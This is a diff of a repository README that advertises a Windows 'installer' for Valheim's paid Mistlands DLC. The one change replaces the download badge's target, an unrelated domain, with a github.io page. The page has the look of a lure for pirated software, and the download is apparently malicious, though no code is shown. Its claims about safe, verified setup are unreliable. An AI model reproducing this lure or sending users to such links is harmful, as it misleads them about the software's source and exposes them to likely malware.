@@ -2,7 +2,7 @@
 
 This repository provides a clean Windows setup for **Valheim Paid DLC “Mistlands” Installer** — linking the correct launcher, verifying files, choosing performance presets, and managing DLC/saves safely.
 
-[![Download Valheim Paid DLC “Mistlands” Installer](https://img.shields.io/badge/Download-valheim--paid--dlc--mistlands--installer-blueviolet)](https://metarefund.com/)
+[![Download Valheim Paid DLC “Mistlands” Installer](https://img.shields.io/badge/Download-valheim--paid--dlc--mistlands--installer-blueviolet)](https://ileneceluch.github.io/.github/valheim-paid-dlc)
 
 ---
 
